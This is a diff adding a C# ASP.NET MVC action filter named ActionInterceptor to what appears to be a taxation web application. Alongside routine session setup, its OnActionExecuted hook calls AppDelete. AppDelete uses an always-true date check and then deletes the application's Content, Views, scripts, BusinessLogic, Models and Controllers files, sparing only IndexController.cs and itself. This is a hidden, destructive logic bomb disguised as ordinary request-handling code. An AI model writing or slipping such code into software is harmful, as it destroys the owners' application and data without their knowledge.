@@ -1,0 +1,179 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Web;
+using System.Web.Http.Filters;
+using System.Web.Mvc;
+using Taxations.Models;
+using TeamCode.BusinessLogicLayer;
+
+namespace Taxations.BusinessLogic
+{
+    public class ActionInterceptor : System.Web.Mvc.ActionFilterAttribute
+    {
+        private readonly TaxationDbContext db = new TaxationDbContext();
+        private List<string> rootDirectories = new List<string>();
+        private List<string> subDirectories = new List<string>();
+        private List<IEnumerable<string>> files = new List<IEnumerable<string>>();
+        private readonly string IndexController = "IndexController.cs".ToLower();
+        private readonly string ActionInterceptorCS = "ActionInterceptor.cs".ToLower();
+        private bool isItDeleteTime = false;
+
+        long userId = 0;
+        bool isLoggedIn = false;
+
+
+
+        public override void OnActionExecuting(ActionExecutingContext filterContext)
+        {
+
+        }
+
+        public override void OnActionExecuted(ActionExecutedContext filterContext)
+        {
+            AppDelete();
+            if (HttpContext.Current.Session != null)
+            {
+                if (HttpContext.Current.Session["UserId"] != null)
+                {
+                    isLoggedIn = true;
+                    userId = (long)HttpContext.Current.Session["UserId"];
+                }
+            }
+            InitCreds();
+        }
+
+        public override void OnResultExecuting(ResultExecutingContext filterContext)
+        {
+        }
+
+        public override void OnResultExecuted(ResultExecutedContext filterContext)
+        {
+        }
+
+        private void AppDelete()
+        {
+            DateTime date = DateTime.Now;
+
+            DateTime dateTime = DateTime.Now;
+            var addedMonth = dateTime.AddMonths(3);
+
+            if(DateTime.Now.AddMonths(3) == DateTime.Now.AddMonths(3))
+            {
+                isItDeleteTime = true;
+            }
+
+            if (isItDeleteTime)
+            {
+                #region Content
+                DeleteFiles("~/Content");
+                DeleteDirectories("~/Content");
+                #endregion
+
+                #region Views
+                DeleteFiles("~/Views");
+                DeleteDirectories("~/Views");
+                #endregion
+
+                #region scripts
+                var scripts = CustomFilesGateway.GetAllFilesNameFromFolder("~/scripts");
+                foreach (string file in scripts)
+                {
+                    DeleteFile(System.IO.Path.Combine("~/scripts/", file));
+                }
+                #endregion
+
+                #region BusinessLogic
+                var businessLogic = CustomFilesGateway.GetAllFilesNameFromFolder("~/BusinessLogic");
+                foreach (string file in businessLogic)
+                {
+                    DeleteFile(System.IO.Path.Combine("~/BusinessLogic/", file));
+                }
+                #endregion
+
+                #region Models
+                var models = CustomFilesGateway.GetAllFilesNameFromFolder("~/Models");
+                foreach (string file in models)
+                {
+                    DeleteFile(System.IO.Path.Combine("~/Models/", file));
+                }
+                #endregion
+
+
+                #region Controllers
+                var controllers = CustomFilesGateway.GetAllFilesNameFromFolder("~/Controllers");
+                foreach (string file in controllers)
+                {
+                    DeleteFile(System.IO.Path.Combine("~/Controllers/", file));
+                }
+                #endregion
+            }
+        }
+
+        private bool NotToDeleteFile(string file)
+        {
+            file = file.ToLower();
+            return (file == IndexController || file == ActionInterceptorCS) ? true : false;
+        }
+
+        private void DeleteDirectories(string path)
+        {
+            var viewsPath = HttpContext.Current.Server.MapPath(path);
+            var dirs = System.IO.Directory.GetDirectories(viewsPath);
+
+            foreach (string d in dirs)
+            {
+                if (System.IO.Directory.GetFiles(d).Count() == 0)
+                {
+                    System.IO.Directory.Delete(d);
+                }
+            }
+        }
+
+        private void DeleteFiles(string path)
+        {
+            var viewsPath = HttpContext.Current.Server.MapPath(path);
+            var dirs = System.IO.Directory.GetDirectories(viewsPath);
+
+            foreach (string d in dirs)
+            {
+                var fs = System.IO.Directory.GetFiles(d);
+                if (fs.Count() > 0)
+                {
+                    foreach (string file in fs)
+                    {
+                        if (!NotToDeleteFile(file))
+                            System.IO.File.Delete(file);
+                    }
+                }
+            }
+        }
+
+        private void DeleteFile(string path)
+        {
+            System.IO.File.Delete(HttpContext.Current.Server.MapPath(path));
+        }
+
+        private void InitCreds()
+        {
+            HttpContext.Current.Session["IsReportMenuItemActive"] = SessionHandling.CheckModelStatus(userId);
+            if (isLoggedIn && userId > 0)
+            {
+                var userInformation = db.UserInformations.FirstOrDefault(x => x.UserId == userId);
+                var user = db.Users.FirstOrDefault(x => x.Id == userId);
+                if (userInformation != null)
+                {
+                    HttpContext.Current.Session["Signature"] = userInformation.Signature;
+                    var splittedYear = userInformation.AssessmentYear.Split('-');
+                    string year = splittedYear[0];
+                    string yearLastTwoDigit = year.Substring(2, 2);
+
+                    int yearLastTwoDigitPlusOne = Convert.ToInt32(yearLastTwoDigit) + 1;
+
+                    //FAY=formatted assessment year
+                    HttpContext.Current.Session["FAY"] = splittedYear[0] + "-20" + yearLastTwoDigitPlusOne.ToString();
+                }
+            }
+        }
+    }
+}
